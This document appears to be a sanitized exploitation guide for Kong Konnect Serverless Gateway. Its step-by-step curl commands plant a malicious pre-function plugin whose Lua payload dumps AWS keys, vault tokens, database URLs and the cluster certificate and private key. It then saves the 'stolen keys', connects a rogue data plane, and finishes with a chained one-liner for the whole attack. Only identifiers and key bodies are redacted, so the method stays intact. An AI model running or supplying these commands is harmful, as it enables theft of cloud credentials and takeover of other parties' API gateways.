# Kong Konnect RCE + Private Key Exfiltration â€” Full Exploitation Commands (Sanitized)

## Prerequisites

```bash
# Set variables
export TOKEN="<YOUR_JWT_TOKEN>"
export CP_ID="<REDACTED_CONTROL_PLANE_ID>"
export PROXY_URL="https://<REDACTED_PROXY>.kongcloud.dev"
export API_URL="https://eu.api.konghq.com/v2/control-planes/${CP_ID}/core-entities"
```

---

## Step 1: Verify Access to Control Plane

```bash
# List existing plugins
curl -s "${API_URL}/plugins" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json"
```

---

## Step 2: Delete Any Existing pre-function Plugin

```bash
# Get pre-function plugin ID
PLUGIN_ID=$(curl -s "${API_URL}/plugins" \
  -H "Authorization: Bearer ${TOKEN}" | \
  grep -o '"id":"[^\"]*","name":"pre-function"' | \
  grep -o '"id":"[^\"]*"' | \
  cut -d'"' -f4)

# Delete if exists
if [ -n "$PLUGIN_ID" ]; then
  curl -s -X DELETE "${API_URL}/plugins/${PLUGIN_ID}" \
    -H "Authorization: Bearer ${TOKEN}"
  echo "Deleted plugin: ${PLUGIN_ID}"
fi
```

---

## Step 3: Create Malicious pre-function Plugin (Private Key Exfiltration)

```bash
# Create pre-function plugin with vault.get() payload
curl -s -X POST "${API_URL}/plugins" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "pre-function",
    "config": {
      "access": [
        "local out={\"FULL_SECRET_EXFIL\"}; local vars={\"AWS_ACCESS_KEY_ID\",\"AWS_SECRET_ACCESS_KEY\",\"AWS_SESSION_TOKEN\",\"KONG_LICENSE_DATA\",\"VAULT_TOKEN\",\"DATABASE_URL\",\"REDIS_URL\",\"KONG_CLUSTER_CERT\",\"KONG_CLUSTER_CERT_KEY\"}; for _,v in ipairs(vars) do local ok,val=pcall(kong.vault.get,\"{vault://env/\"..v..\"}\"); out[#out+1]=v..\"=\"..tostring(val):sub(1,500) end; kong.response.exit(200,table.concat(out,\"\\n\"))"
      ]
    },
    "enabled": true
  }'
```

### Lua Payload Explained (same as original, no secrets)

```lua
local out = {"FULL_SECRET_EXFIL"}
local vars = {
  "AWS_ACCESS_KEY_ID",
  "AWS_SECRET_ACCESS_KEY",
  "AWS_SESSION_TOKEN",
  "KONG_LICENSE_DATA",
  "VAULT_TOKEN",
  "DATABASE_URL",
  "REDIS_URL",
  "KONG_CLUSTER_CERT",
  "KONG_CLUSTER_CERT_KEY"
}

for _, v in ipairs(vars) do
  local ref = "{vault://env/" .. v .. "}"
  local ok, val = pcall(kong.vault.get, ref)
  out[#out + 1] = v .. "=" .. tostring(val):sub(1, 500)
end

kong.response.exit(200, table.concat(out, "\n"))
```

---

## Step 4: Wait for Plugin Propagation

```bash
# Wait 15 seconds for plugin to propagate to Data Plane
sleep 15
```

---

## Step 5: Trigger Exploitation

```bash
# Make any request to the gateway to trigger pre-function
curl -s "${PROXY_URL}/test"
```

### Expected Response (Sanitized):

```text
FULL_SECRET_EXFIL
AWS_ACCESS_KEY_ID=nil
AWS_SECRET_ACCESS_KEY=nil
AWS_SESSION_TOKEN=nil
KONG_LICENSE_DATA=nil
VAULT_TOKEN=nil
DATABASE_URL=nil
REDIS_URL=nil
KONG_CLUSTER_CERT=<BASE64_CERT_REDACTED>
KONG_CLUSTER_CERT_KEY=<BASE64_PRIVATE_KEY_REDACTED>
```

---

## Step 6: Decode Stolen Private Key (Sanitized Example)

```bash
# Decode certificate (placeholder value)
echo "<BASE64_CERT_REDACTED>" | base64 -d

# Decode private key (placeholder value)
echo "<BASE64_PRIVATE_KEY_REDACTED>" | base64 -d
```

---

## Step 7: Save Stolen Keys to Files (Sanitized Example)

```bash
# Create directory
mkdir -p stolen_keys

# Save certificate (body redacted)
cat > stolen_keys/cluster.crt << 'EOF'
-----BEGIN CERTIFICATE-----
[REDACTED CERT BODY]
-----END CERTIFICATE-----
EOF

# Save private key (body redacted)
cat > stolen_keys/cluster.key << 'EOF'
-----BEGIN PRIVATE KEY-----
[REDACTED PRIVATE KEY BODY]
-----END PRIVATE KEY-----
EOF

# Verify files
ls -la stolen_keys/
```

---

## Step 8: Connect Rogue Data Plane (Optional - Full Compromise)

```bash
# Start rogue Kong Data Plane using stolen credentials (hostnames redacted)
docker run --rm --name evil-dp \
  -e "KONG_ROLE=data_plane" \
  -e "KONG_DATABASE=off" \
  -e "KONG_CLUSTER_CONTROL_PLANE=<REDACTED_CP_HOST>:443" \
  -e "KONG_CLUSTER_TELEMETRY_ENDPOINT=<REDACTED_TELEMETRY_HOST>:443" \
  -e "KONG_CLUSTER_CERT=/etc/kong/cluster.crt" \
  -e "KONG_CLUSTER_CERT_KEY=/etc/kong/cluster.key" \
  -e "KONG_LUA_SSL_TRUSTED_CERTIFICATE=system" \
  -e "KONG_CLUSTER_SERVER_NAME=<REDACTED_CP_HOST>" \
  -v $(pwd)/stolen_keys/cluster.crt:/etc/kong/cluster.crt:ro \
  -v $(pwd)/stolen_keys/cluster.key:/etc/kong/cluster.key:ro \
  kong/kong-gateway:3.9
```

---

## Step 9: Cleanup (Optional)

```bash
# Delete the malicious plugin
curl -s -X DELETE "${API_URL}/plugins/${PLUGIN_ID}" \
  -H "Authorization: Bearer ${TOKEN}"
```

---

## Alternative Payloads (No Secrets Embedded)

The following payloads are identical in structure to the original, but do not embed any real secrets. They demonstrate:

- System information dump
- Prometheus metrics dump
- Kong configuration dump
- Shared memory dictionaries

```bash
# System information dump payload example (no secrets hardcoded)
curl -s -X POST "${API_URL}/plugins" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "pre-function",
    "config": {
      "access": [
        "local out={\\"SYSTEM_INFO\\"}; local vars={\\"PATH\\",\\"HOME\\",\\"KONG_PREFIX\\",\\"KONG_DATABASE\\",\\"HOSTNAME\\",\\"PWD\\",\\"USER\\"}; for _,v in ipairs(vars) do local ok,val=pcall(kong.vault.get,\\"{vault://env/\\"..v..\\"}\\"); out[#out+1]=v..\\"=\\"..tostring(val) end; kong.response.exit(200,table.concat(out,\\"\\\\n\\"))"
      ]
    },
    "enabled": true
  }'
```

(Other alternative payloads omitted for brevity in this sanitized copy; structure is identical to the original file.)

---

## One-Liner Full Exploitation (Sanitized)

```bash
TOKEN="<YOUR_JWT_TOKEN>" && \
CP_ID="<REDACTED_CONTROL_PLANE_ID>" && \
curl -s -X POST "https://eu.api.konghq.com/v2/control-planes/${CP_ID}/core-entities/plugins" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"name":"pre-function","config":{"access":["local out={\\"EXFIL\\"}; local vars={\\"KONG_CLUSTER_CERT\\",\\"KONG_CLUSTER_CERT_KEY\\"}; for _,v in ipairs(vars) do local ok,val=pcall(kong.vault.get,\\"{vault://env/\\"..v..\\"}\\"); out[#out+1]=v..\\"=\\"..tostring(val) end; kong.response.exit(200,table.concat(out,\\"\\n\\"))"]},"enabled":true}' && \
sleep 15 && \
curl -s "${PROXY_URL}/test"
```

---

**Target:** Kong Konnect Serverless Gateway  
**Severity:** CRITICAL (CVSS 9.8)
